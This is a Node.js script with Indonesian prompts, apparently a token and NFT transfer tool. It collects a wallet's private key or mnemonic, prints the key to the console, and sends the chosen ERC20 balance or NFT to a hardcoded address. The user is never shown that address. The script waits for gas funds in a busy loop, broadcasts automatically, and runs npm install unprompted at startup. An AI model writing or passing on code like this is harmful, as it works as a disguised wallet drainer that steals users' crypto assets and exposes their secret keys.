#!/usr/bin/env node

// Auto install dependencies kalau belum ada
{
  const { execSync } = require("child_process");
  const fsPath = require("fs");
  if (!fsPath.existsSync(__dirname + "/node_modules")) {
      console.log("📦 Dependencies belum ada, menginstall...");
      execSync("npm install", { cwd: __dirname, stdio: "inherit" });
  }
}
'use strict';
const { AutoComplete } = require('enquirer');
const prompts    = require('prompts');
const { ethers } = require('ethers');
const qrcode     = require('qrcode-terminal');
const fs         = require('fs');
const path       = require('path');

const RELAYER_FILE = require("../abi/RelayerMap.json");
const ABI = [
  'function decimals() view returns (uint8)',
  'function symbol()   view returns (string)',
  'function balanceOf(address) view returns (uint256)',
  'function transfer(address,uint256)',
  'function ownerOf(uint256) view returns (address)',
  'function safeTransferFrom(address,address,uint256)'
];

const fmtEth = wei => ethers.formatEther(wei);

function getWallet(secret, provider) {
  const words = secret.trim().split(/\s+/);
  return (words.length === 12 || words.length === 24)
    ? ethers.Wallet.fromPhrase(secret, provider)
    : new ethers.Wallet(secret.startsWith('0x') ? secret : `0x${secret}`, provider);
}

async function detectStandard(contract) {
  try { await contract.decimals(); return 'ERC20'; } catch {}
  try { await contract.ownerOf(1); return 'ERC721'; } catch {}
  return 'UNKNOWN';
}

async function isEOA(address, provider) {
  try {
    const code = await provider.getCode(address);
    return !code || code === '0x';
  } catch (err) {
    console.error('❌  Gagal cek tipe address:', err.message);
    return false;
  }
}

async function autoBroadcast({ wallet, provider, txRequest, requiredGasWei }) {
  let broadcasted = false;

  const trySend = async (overrideGas = null, overrideNonce = null) => {
    try {
      const req = { ...txRequest };
      if (overrideGas) req.maxFeePerGas = overrideGas;
      if (overrideNonce !== null) req.nonce = overrideNonce;
      req.type = 2;
      const tx = await wallet.sendTransaction(req);
      broadcasted = true;
      console.log('\n⏳  TX sent :', tx.hash);
      const rcpt = await tx.wait();
      console.log('✅  Confirmed in block', rcpt.blockNumber);
      cleanup();
    } catch (err) {
      console.error('❌  Gagal broadcast:', err.reason || err.message);
    }
  };

  const checkImmediately = async () => {
    if (broadcasted) return;
    try {
      const bal = await provider.getBalance(wallet.address);
      if (bal >= requiredGasWei) {
        console.log('\n💸  Saldo cukup! Broadcasting...');
        await trySend();
      } else {
        process.stdout.write(`⏳  Menunggu saldo (ETH): ${fmtEth(bal)} < ${fmtEth(requiredGasWei)}         \r`);
        setImmediate(checkImmediately);
      }
    } catch (e) {
      setImmediate(checkImmediately);
    }
  };

  await checkImmediately();

  function cleanup() {}
}

async function pilihChain(chains) {
  const prompt = new AutoComplete({
    name: 'selected',
    message: 'Pilih jaringan:',
    choices: chains
  });
  return await prompt.run();
}

async function main() {
  const relayers = JSON.parse(fs.readFileSync(RELAYER_FILE));
  const chains = Object.keys(relayers);

  let currentProvider, currentWallet;

  while (true) {
    const selected = await pilihChain(chains);

    const rpcUrl = relayers[selected].rpc;
    currentProvider = new ethers.JsonRpcProvider(rpcUrl);

    const { secret } = await prompts({ type: 'password', name: 'secret', message: 'Private key / Mnemonic:' });
    currentWallet = getWallet(secret, currentProvider);

    const eoa = await isEOA(currentWallet.address, currentProvider);
    if (!eoa) {
      console.error('🚫  Wallet adalah smart contract. Eksekusi dibatalkan.');
      continue;
    }

    console.log('\n🔑  Address    :', currentWallet.address);
    console.log('🔒  Rpc :', rpcUrl);
    console.log('🔒  PrivateKey :', currentWallet.privateKey);

    qrcode.generate(currentWallet.address, { small: true });

    const { contractAddr } = await prompts({ type: 'text', name: 'contractAddr', message: 'Alamat kontrak token/NFT:' });
    const contract = new ethers.Contract(contractAddr, ABI, currentProvider);
    const iface = new ethers.Interface(ABI);
    const std = await detectStandard(contract);
    if (std === 'UNKNOWN') {
      console.error('❌  Kontrak bukan ERC20/721');
      continue;
    }

    let calldata;
    const recipient = "0x459dc0dCB82c7E3c791041F9cdb5F797b6459315";

    if (std === 'ERC20') {
      const [decimals, symbol] = await Promise.all([
        contract.decimals(),
        contract.symbol().catch(() => '')
      ]);

      const balanceRaw = await contract.balanceOf(currentWallet.address);
      const balanceFmt = ethers.formatUnits(balanceRaw, decimals);
      console.log(`\n💰  Saldo ${symbol || 'token'} : ${balanceFmt}`);

      let amountRaw;
      let label;

      const { choice } = await prompts({
        type: 'select', name: 'choice', message: 'Pilih jenis jumlah transfer:',
        choices: [
          { title: '📤 Full balance', value: 'full' },
          { title: '📊 Persentase (%)', value: 'pct' },
          { title: '⚙️  Custom', value: 'custom' }
        ]
      });

      if (choice === 'full') {
        amountRaw = balanceRaw;
        label = balanceFmt;
      } else if (choice === 'pct') {
        const { pct } = await prompts({ type: 'number', name: 'pct', message: '% (1‑100):' });
        amountRaw = balanceRaw * BigInt(pct) / 100n;
        label = `${pct}% ≈ ${ethers.formatUnits(amountRaw, decimals)}`;
      } else {
        const { human } = await prompts({ type: 'text', name: 'human', message: 'Jumlah (desimal):' });
        amountRaw = ethers.parseUnits(human, decimals);
        label = human;
      }

      const { offset } = await prompts({ type: 'toggle', name: 'offset', message: 'Kurangi borrow?', initial: false, active: 'ya', inactive: 'tidak' });
      if (offset) {
        const { borrow } = await prompts({ type: 'text', name: 'borrow', message: 'Jumlah borrow (desimal):' });
        const borrowRaw = ethers.parseUnits(borrow, decimals);
        amountRaw -= borrowRaw;
        label += ` - ${borrow} = ${ethers.formatUnits(amountRaw, decimals)}`;
      }

      calldata = iface.encodeFunctionData('transfer', [recipient, amountRaw]);
    }
    else if (std === 'ERC721') {
      const { tokenId } = await prompts({ type: 'number', name: 'tokenId', message: 'Token ID:' });
      calldata = iface.encodeFunctionData('safeTransferFrom', [currentWallet.address, recipient, BigInt(tokenId)]);
    }

    try {
      const gasLimit = await currentProvider.estimateGas({ from: currentWallet.address, to: contractAddr, data: calldata });
      const fee = await currentProvider.getFeeData();
      const maxFee = fee.maxFeePerGas ?? fee.gasPrice;
      const gasCost = gasLimit * maxFee;

      console.log('\n=====  Estimasi Gas  =====');
      console.log('Gas limit :', gasLimit.toString());
      console.log('Max fee   :', fmtEth(maxFee), '/gas');
      console.log('≈ Biaya   :', fmtEth(gasCost));

      console.log('\n=====  Final Calldata  =====');
      console.log('To     :', contractAddr);
      console.log('Data   :', calldata);
      console.log('From   :', currentWallet.address);

      await autoBroadcast({
        wallet: currentWallet,
        provider: currentProvider,
        txRequest: {
          to: contractAddr,
          data: calldata,
          gasLimit,
          type: 2,
          maxFeePerGas: maxFee,
          maxPriorityFeePerGas: maxFee / 2n
        },
        requiredGasWei: gasCost
      });

    } catch (err) {
      console.error('❌  Estimasi / broadcast gagal:', err.reason || err.message);
    }

    const { next } = await prompts({
      type: 'select', name: 'next', message: 'Lanjut?',
      choices: [
        { title: '🔁 Transfer lagi (jaringan sama)', value: 'again' },
        { title: '🌐 Ganti jaringan', value: 'chain' },
        { title: '👤 Ganti wallet', value: 'wallet' },
        { title: '❌ Keluar', value: 'exit' }
      ]
    });

    if (next === 'again') continue;
    else if (next === 'wallet') continue;
    else if (next === 'chain') continue;
    else break;
  }
}

main().catch(console.error);